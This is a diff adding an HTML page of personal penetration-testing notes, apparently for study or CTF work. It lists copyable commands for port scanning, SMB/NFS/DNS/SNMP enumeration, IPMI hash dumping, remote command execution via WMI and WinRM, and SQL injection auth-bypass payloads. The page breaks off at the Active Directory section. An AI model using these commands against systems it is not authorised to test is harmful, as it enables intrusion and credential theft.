@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Notes & Tools — Hamoodi</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #080608;
+      --surface: #0f0a0a;
+      --surface2: #140d0d;
+      --border: #2a1515;
+      --red: #e03030;
+      --red-bright: #ff4444;
+      --red-glow: rgba(224,48,48,0.12);
+      --red-dim: #8b1a1a;
+      --text: #d4c4c4;
+      --muted: #5a3f3f;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-display: 'Bebas Neue', sans-serif;
+      --font-body: 'DM Sans', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-body);
+      min-height: 100vh;
+      overflow-x: hidden;
+      cursor: crosshair;
+    }
+
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        to bottom, transparent, transparent 2px,
+        rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px
+      );
+      pointer-events: none; z-index: 100;
+    }
+
+    .bg-grid {
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(var(--border) 1px, transparent 1px),
+        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 44px 44px;
+      opacity: 0.25; pointer-events: none; z-index: 0;
+    }
+
+    .bg-glow {
+      position: fixed; top: -300px; right: -200px;
+      width: 700px; height: 700px;
+      background: radial-gradient(circle, rgba(180,30,30,0.07) 0%, transparent 65%);
+      pointer-events: none; z-index: 0;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 50;
+      padding: 1rem 2rem;
+      display: flex; justify-content: space-between; align-items: center;
+      border-bottom: 1px solid var(--border);
+      background: rgba(8,6,8,0.88);
+      backdrop-filter: blur(14px);
+    }
+
+    .nav-logo {
+      font-family: var(--font-mono); font-size: 0.78rem;
+      color: var(--red); letter-spacing: 0.15em; text-transform: uppercase;
+      text-decoration: none;
+    }
+
+    .nav-links { display: flex; gap: 2rem; list-style: none; }
+    .nav-links a {
+      font-family: var(--font-mono); font-size: 0.7rem;
+      color: var(--muted); text-decoration: none;
+      letter-spacing: 0.12em; text-transform: uppercase;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover { color: var(--red-bright); }
+    .nav-links a.active { color: var(--red); }
+
+    /* PAGE HEADER */
+    .page-header {
+      position: relative;
+      padding: 7rem 2rem 3.5rem;
+      border-bottom: 1px solid var(--border);
+      overflow: hidden;
+    }
+
+    .page-header-inner {
+      max-width: 900px; margin: 0 auto;
+    }
+
+    .prompt-line {
+      font-family: var(--font-mono); font-size: 0.75rem;
+      color: var(--red); margin-bottom: 1rem;
+      opacity: 0; animation: fadeUp 0.6s ease forwards 0.2s;
+    }
+    .prompt-line span { color: var(--muted); }
+
+    h1 {
+      font-family: var(--font-display);
+      font-size: clamp(3.5rem, 10vw, 7.5rem);
+      line-height: 0.88; letter-spacing: 0.02em; color: #fff;
+      opacity: 0; animation: fadeUp 0.7s ease forwards 0.4s;
+    }
+    h1 em { font-style: normal; color: var(--red); text-shadow: 0 0 40px var(--red-glow), 0 0 80px var(--red-glow); }
+
+    .page-sub {
+      font-family: var(--font-mono); font-size: 0.78rem;
+      color: var(--muted); margin-top: 1.2rem;
+      letter-spacing: 0.15em; text-transform: uppercase;
+      opacity: 0; animation: fadeUp 0.7s ease forwards 0.6s;
+    }
+
+    /* MAIN LAYOUT */
+    .layout {
+      position: relative; z-index: 1;
+      max-width: 900px; margin: 0 auto;
+      padding: 3.5rem 2rem 8rem;
+      display: grid;
+      grid-template-columns: 200px 1fr;
+      gap: 3rem;
+      align-items: start;
+    }
+
+    /* SIDEBAR */
+    .sidebar {
+      position: sticky; top: 5rem;
+      display: flex; flex-direction: column; gap: 0.3rem;
+      opacity: 0; animation: fadeUp 0.7s ease forwards 0.8s;
+    }
+
+    .sidebar-label {
+      font-family: var(--font-mono); font-size: 0.6rem;
+      color: var(--muted); letter-spacing: 0.2em;
+      text-transform: uppercase; margin-bottom: 0.6rem;
+      padding-bottom: 0.6rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .sidebar a {
+      font-family: var(--font-mono); font-size: 0.7rem;
+      color: var(--muted); text-decoration: none;
+      letter-spacing: 0.08em; text-transform: uppercase;
+      padding: 0.45rem 0.7rem;
+      border-left: 2px solid transparent;
+      transition: all 0.2s;
+      display: flex; align-items: center; gap: 0.5rem;
+    }
+    .sidebar a:hover { color: var(--text); border-left-color: var(--red-dim); }
+    .sidebar a.active { color: var(--red); border-left-color: var(--red); background: var(--red-glow); }
+
+    /* CONTENT */
+    .content { display: grid; gap: 4rem; }
+
+    /* SECTION */
+    .notes-section {
+      opacity: 0; transform: translateY(18px);
+      transition: opacity 0.65s ease, transform 0.65s ease;
+    }
+    .notes-section.visible { opacity: 1; transform: translateY(0); }
+
+    .section-label {
+      font-family: var(--font-mono); font-size: 0.65rem;
+      text-transform: uppercase; letter-spacing: 0.22em;
+      color: var(--red); margin-bottom: 1.6rem;
+      display: flex; align-items: center; gap: 0.8rem;
+    }
+    .section-label::after {
+      content: ''; flex: 1; height: 1px;
+      background: linear-gradient(to right, var(--border), transparent);
+    }
+
+    /* NOTE CARD */
+    .note-card {
+      border: 1px solid var(--border);
+      background: var(--surface);
+      margin-bottom: 1px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+    .note-card:hover { border-color: var(--red-dim); }
+
+    .note-header {
+      padding: 1rem 1.2rem;
+      display: flex; justify-content: space-between; align-items: center;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .note-title {
+      font-family: var(--font-mono); font-size: 0.82rem;
+      color: #fff; letter-spacing: 0.05em;
+      display: flex; align-items: center; gap: 0.6rem;
+    }
+    .note-title::before { content: '▸'; color: var(--red); transition: transform 0.2s; }
+    .note-card.open .note-title::before { transform: rotate(90deg); }
+
+    .note-tag {
+      font-family: var(--font-mono); font-size: 0.6rem;
+      color: var(--red); border: 1px solid var(--red-dim);
+      padding: 0.1rem 0.45rem; letter-spacing: 0.08em; text-transform: uppercase;
+    }
+
+    .note-body {
+      display: none;
+      padding: 0 1.2rem 1.2rem;
+      border-top: 1px solid var(--border);
+    }
+    .note-card.open .note-body { display: block; }
+
+    .note-body p {
+      font-size: 0.85rem; color: var(--muted);
+      line-height: 1.7; margin: 0.8rem 0;
+    }
+    .note-body p strong { color: var(--text); }
+
+    /* CODE BLOCK */
+    .cmd-block {
+      background: #050305;
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--red-dim);
+      padding: 0.8rem 1rem;
+      margin: 0.6rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: #f9a8a8;
+      overflow-x: auto;
+      position: relative;
+    }
+
+    .cmd-block .comment {
+      color: var(--muted); display: block; margin-bottom: 0.3rem;
+    }
+
+    .cmd-block .cmd { color: #fff; display: block; }
+    .cmd-block .flag { color: var(--red-bright); }
+    .cmd-block .arg  { color: #f9a8a8; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 0.5rem;
+      font-family: var(--font-mono); font-size: 0.55rem;
+      color: var(--muted); background: none;
+      border: 1px solid var(--border);
+      padding: 0.15rem 0.4rem; cursor: pointer;
+      letter-spacing: 0.08em; text-transform: uppercase;
+      transition: all 0.2s;
+    }
+    .copy-btn:hover { color: var(--red); border-color: var(--red); }
+    .copy-btn.copied { color: #28c840; border-color: #28c840; }
+
+    /* EMPTY STATE */
+    .empty-note {
+      font-family: var(--font-mono); font-size: 0.72rem;
+      color: var(--muted); padding: 1.2rem;
+      border: 1px dashed var(--border);
+      letter-spacing: 0.08em;
+    }
+    .empty-note::before { content: '// '; color: var(--red-dim); }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+    @media (max-width: 700px) {
+      .layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; flex-direction: row; flex-wrap: wrap; }
+      h1 { font-size: 3.5rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-grid"></div>
+  <div class="bg-glow"></div>
+
+  <nav>
+    <a class="nav-logo" href="index.html">Hamoodi</a>
+    <ul class="nav-links">
+      <li><a href="index.html#about">About</a></li>
+      <li><a href="index.html#projects">Projects</a></li>
+      <li><a href="notes.html" class="active">Notes</a></li>
+    </ul>
+  </nav>
+
+  <div class="page-header">
+    <div class="page-header-inner">
+      <div class="prompt-line"><span>root@kali:~$</span> cat notes.md</div>
+      <h1>NOTES <em>&amp;</em> TOOLS</h1>
+      <p class="page-sub">Commands · Techniques · References</p>
+    </div>
+  </div>
+
+  <div class="layout">
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <div class="sidebar-label">// jump to</div>
+      <a href="#recon">Recon</a>
+      <a href="#web">Web</a>
+      <a href="#network">Network</a>
+      <a href="#ad">Active Directory</a>
+      <a href="#privesc">Priv Esc</a>
+      <a href="#tools">Tools</a>
+      <a href="#os">OS Commands</a>
+    </aside>
+
+    <!-- CONTENT -->
+    <div class="content">
+
+      <!-- RECON -->
+      <section class="notes-section" id="recon">
+        <div class="section-label">// recon</div>
+
+        <div class="note-card open">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Nmap — Port Scanning</span>
+            <span class="note-tag">Nmap</span>
+          </div>
+          <div class="note-body">
+            <p>Basic host and port discovery commands.</p>
+            <div class="cmd-block">
+              <span class="comment"># Full TCP scan with service/version detection</span>
+              <span class="cmd">nmap <span class="flag">-sC -sV -p-</span> <span class="arg">&lt;target&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Fast scan — top 1000 ports</span>
+              <span class="cmd">nmap <span class="flag">-T4 -F</span> <span class="arg">&lt;target&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># UDP scan</span>
+              <span class="cmd">nmap <span class="flag">-sU --top-ports 100</span> <span class="arg">&lt;target&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># OS detection + aggressive</span>
+              <span class="cmd">nmap <span class="flag">-A -O</span> <span class="arg">&lt;target&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Gobuster — Directory Brute Force</span>
+            <span class="note-tag">Gobuster</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Directory brute force</span>
+              <span class="cmd">gobuster dir <span class="flag">-u</span> <span class="arg">http://&lt;target&gt;</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirb/common.txt</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># With file extensions</span>
+              <span class="cmd">gobuster dir <span class="flag">-u</span> <span class="arg">http://&lt;target&gt;</span> <span class="flag">-w</span> <span class="arg">common.txt</span> <span class="flag">-x</span> <span class="arg">php,html,txt</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+     
+
+
+        <!-- Infrastructure Enumeration -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Infrastructure Enumeration</span>
+            <span class="note-tag">OSINT</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Certificate transparency — find subdomains via crt.sh</span>
+              <span class="cmd">curl <span class="flag">-s</span> <span class="arg">'https://crt.sh/?q=&lt;targetdomain&gt;&output=json'</span> | jq .</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Scan each IP in a list using Shodan</span>
+              <span class="cmd">for i in $(cat ip-addresses.txt);do shodan host $i;done</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- FTP -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">FTP Enumeration</span>
+            <span class="note-tag">FTP</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Interact with FTP service</span>
+              <span class="cmd">ftp <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Interact via netcat</span>
+              <span class="cmd">nc <span class="flag">-nv</span> <span class="arg">&lt;FQDN/IP&gt;</span> 21</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Interact via telnet</span>
+              <span class="cmd">telnet <span class="arg">&lt;FQDN/IP&gt;</span> 21</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Interact via encrypted connection (openssl)</span>
+              <span class="cmd">openssl s_client <span class="flag">-connect</span> <span class="arg">&lt;FQDN/IP&gt;:21</span> <span class="flag">-starttls</span> ftp</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Download all available files from FTP server</span>
+              <span class="cmd">wget <span class="flag">-m --no-passive</span> <span class="arg">ftp://anonymous:anonymous@&lt;target&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- SMB -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">SMB Enumeration</span>
+            <span class="note-tag">SMB</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Null session authentication on SMB</span>
+              <span class="cmd">smbclient <span class="flag">-N -L</span> <span class="arg">//&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Connect to a specific SMB share</span>
+              <span class="cmd">smbclient <span class="arg">//&lt;FQDN/IP&gt;/&lt;share&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Interaction with target using RPC</span>
+              <span class="cmd">rpcclient <span class="flag">-U ""</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Username enumeration using Impacket</span>
+              <span class="cmd">samrdump.py <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Enumerate SMB shares</span>
+              <span class="cmd">smbmap <span class="flag">-H</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Enumerate SMB shares using null session (crackmapexec)</span>
+              <span class="cmd">crackmapexec smb <span class="arg">&lt;FQDN/IP&gt;</span> <span class="flag">--shares -u '' -p ''</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># SMB enumeration using enum4linux</span>
+              <span class="cmd">enum4linux-ng.py <span class="arg">&lt;FQDN/IP&gt;</span> <span class="flag">-A</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- NFS -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">NFS Enumeration</span>
+            <span class="note-tag">NFS</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Show available NFS shares</span>
+              <span class="cmd">showmount <span class="flag">-e</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Mount a specific NFS share</span>
+              <span class="cmd">mount <span class="flag">-t nfs</span> <span class="arg">&lt;FQDN/IP&gt;:/&lt;share&gt;</span> ./target-NFS/ <span class="flag">-o nolock</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Unmount the NFS share</span>
+              <span class="cmd">umount ./target-NFS</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- DNS -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">DNS Enumeration</span>
+            <span class="note-tag">DNS</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># NS request to specific nameserver</span>
+              <span class="cmd">dig ns <span class="arg">&lt;domain.tld&gt;</span> @<span class="arg">&lt;nameserver&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># ANY request to specific nameserver</span>
+              <span class="cmd">dig any <span class="arg">&lt;domain.tld&gt;</span> @<span class="arg">&lt;nameserver&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># AXFR (zone transfer) request</span>
+              <span class="cmd">dig axfr <span class="arg">&lt;domain.tld&gt;</span> @<span class="arg">&lt;nameserver&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Subdomain brute forcing with dnsenum</span>
+              <span class="cmd">dnsenum <span class="flag">--dnsserver</span> <span class="arg">&lt;nameserver&gt;</span> <span class="flag">--enum -p 0 -s 0 -o</span> found_subdomains.txt <span class="flag">-f</span> ~/subdomains.list <span class="arg">&lt;domain.tld&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- SMTP -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">SMTP Enumeration</span>
+            <span class="note-tag">SMTP</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Connect to SMTP service via telnet</span>
+              <span class="cmd">telnet <span class="arg">&lt;FQDN/IP&gt;</span> 25</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- IMAP/POP3 -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">IMAP / POP3 Enumeration</span>
+            <span class="note-tag">IMAP</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Log in to IMAPS using curl</span>
+              <span class="cmd">curl <span class="flag">-k</span> <span class="arg">'imaps://&lt;FQDN/IP&gt;'</span> <span class="flag">--user</span> <span class="arg">&lt;user&gt;:&lt;password&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Connect to IMAPS service</span>
+              <span class="cmd">openssl s_client <span class="flag">-connect</span> <span class="arg">&lt;FQDN/IP&gt;:imaps</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Connect to POP3s service</span>
+              <span class="cmd">openssl s_client <span class="flag">-connect</span> <span class="arg">&lt;FQDN/IP&gt;:pop3s</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- SNMP -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">SNMP Enumeration</span>
+            <span class="note-tag">SNMP</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Query OIDs using snmpwalk</span>
+              <span class="cmd">snmpwalk <span class="flag">-v2c -c</span> <span class="arg">&lt;community string&gt;</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Bruteforce community strings</span>
+              <span class="cmd">onesixtyone <span class="flag">-c</span> community-strings.list <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Bruteforce SNMP OIDs using braa</span>
+              <span class="cmd">braa <span class="arg">&lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- MySQL -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">MySQL Enumeration</span>
+            <span class="note-tag">MySQL</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Login to MySQL server</span>
+              <span class="cmd">mysql <span class="flag">-u</span> <span class="arg">&lt;user&gt;</span> <span class="flag">-p</span><span class="arg">&lt;password&gt;</span> <span class="flag">-h</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- MSSQL -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">MSSQL Enumeration</span>
+            <span class="note-tag">MSSQL</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Login to MSSQL using Windows auth (Impacket)</span>
+              <span class="cmd">mssqlclient.py <span class="arg">&lt;user&gt;@&lt;FQDN/IP&gt;</span> <span class="flag">-windows-auth</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- IPMI -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">IPMI Enumeration</span>
+            <span class="note-tag">IPMI</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># IPMI version detection (Metasploit)</span>
+              <span class="cmd">msf6 auxiliary(scanner/ipmi/ipmi_version)</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Dump IPMI hashes (Metasploit)</span>
+              <span class="cmd">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Linux Remote Management -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Linux Remote Management (SSH)</span>
+            <span class="note-tag">SSH</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Remote security audit against SSH</span>
+              <span class="cmd">ssh-audit.py <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Login via SSH</span>
+              <span class="cmd">ssh <span class="arg">&lt;user&gt;@&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Login via SSH using private key</span>
+              <span class="cmd">ssh <span class="flag">-i</span> private.key <span class="arg">&lt;user&gt;@&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Enforce password-based authentication</span>
+              <span class="cmd">ssh <span class="arg">&lt;user&gt;@&lt;FQDN/IP&gt;</span> <span class="flag">-o PreferredAuthentications=password</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Windows Remote Management -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Windows Remote Management</span>
+            <span class="note-tag">WinRM / RDP</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Check RDP security settings</span>
+              <span class="cmd">rdp-sec-check.pl <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Login to RDP from Linux</span>
+              <span class="cmd">xfreerdp <span class="flag">/u:</span><span class="arg">&lt;user&gt;</span> <span class="flag">/p:</span><span class="arg">"&lt;password&gt;"</span> <span class="flag">/v:</span><span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Login to WinRM server</span>
+              <span class="cmd">evil-winrm <span class="flag">-i</span> <span class="arg">&lt;FQDN/IP&gt;</span> <span class="flag">-u</span> <span class="arg">&lt;user&gt;</span> <span class="flag">-p</span> <span class="arg">&lt;password&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Execute command via WMI</span>
+              <span class="cmd">wmiexec.py <span class="arg">&lt;user&gt;:"&lt;password&gt;"@&lt;FQDN/IP&gt;</span> <span class="arg">"&lt;system command&gt;"</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Oracle TNS -->
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Oracle TNS Enumeration</span>
+            <span class="note-tag">Oracle</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Scan Oracle DB services with odat</span>
+              <span class="cmd">./odat.py all <span class="flag">-s</span> <span class="arg">&lt;FQDN/IP&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Login to Oracle database</span>
+              <span class="cmd">sqlplus <span class="arg">&lt;user&gt;/&lt;pass&gt;@&lt;FQDN/IP&gt;/&lt;db&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Upload a file with Oracle RDBMS</span>
+              <span class="cmd">./odat.py utlfile <span class="flag">-s</span> <span class="arg">&lt;FQDN/IP&gt;</span> <span class="flag">-d</span> <span class="arg">&lt;db&gt;</span> <span class="flag">-U</span> <span class="arg">&lt;user&gt;</span> <span class="flag">-P</span> <span class="arg">&lt;pass&gt;</span> <span class="flag">--sysdba --putFile</span> <span class="arg">C:\path file.txt ./file.txt</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- WEB -->
+      <section class="notes-section" id="web">
+        <div class="section-label">// web exploitation</div>
+
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">SQL Injection — Basic Payloads</span>
+            <span class="note-tag">SQLi</span>
+          </div>
+          <div class="note-body">
+            <p>Common payloads for testing and manual SQLi.</p>
+            <div class="cmd-block">
+              <span class="comment"># Auth bypass</span>
+              <span class="cmd"><span class="arg">' OR '1'='1</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Error-based detection</span>
+              <span class="cmd"><span class="arg">' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># SQLMap automated</span>
+              <span class="cmd">sqlmap <span class="flag">-u</span> <span class="arg">"http://target/page?id=1"</span> <span class="flag">--dbs</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+
+
+      </section>
+
+      <!-- NETWORK -->
+      <section class="notes-section" id="network">
+        <div class="section-label">// network</div>
+
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Wireshark — Useful Filters</span>
+            <span class="note-tag">Wireshark</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Filter by protocol</span>
+              <span class="cmd"><span class="arg">http</span> or <span class="arg">dns</span> or <span class="arg">ftp</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Filter by IP</span>
+              <span class="cmd">ip.addr == <span class="arg">&lt;target_ip&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Show only POST requests</span>
+              <span class="cmd">http.request.method == <span class="arg">"POST"</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+
+
+      </section>
+
+      <!-- ACTIVE DIRECTORY -->
+      <section class="notes-section" id="ad">
+        <div class="section-label">// active directory</div>
+
+        <div class="note-card">
